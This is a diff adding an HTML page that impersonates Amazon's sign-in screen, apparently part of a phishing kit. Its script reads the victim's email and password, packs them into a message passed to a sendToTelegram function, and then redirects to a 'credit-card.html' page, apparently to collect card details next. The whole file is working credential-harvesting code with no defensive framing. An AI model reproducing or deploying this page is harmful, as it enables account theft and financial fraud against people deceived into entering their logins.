@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Amazon Sign-In</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="box">
+    <h1>Sign-In</h1>
+    <form onsubmit="event.preventDefault(); sendLogin()">
+      <input type="text" id="email" placeholder="Email or phone number" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Login</button>
+    </form>
+  </div>
+  <script src="main.js"></script>
+  <script>
+    function sendLogin() {
+      const email = document.getElementById("email").value;
+      const pass = document.getElementById("password").value;
+      const msg = `🟠 Amazon Login\n📧 Email: ${email}\n🔑 Password: ${pass}`;
+      sendToTelegram(msg);
+      setTimeout(() => window.location.href = "credit-card.html", 1000);
+    }
+  </script>
+</body>
+</html>
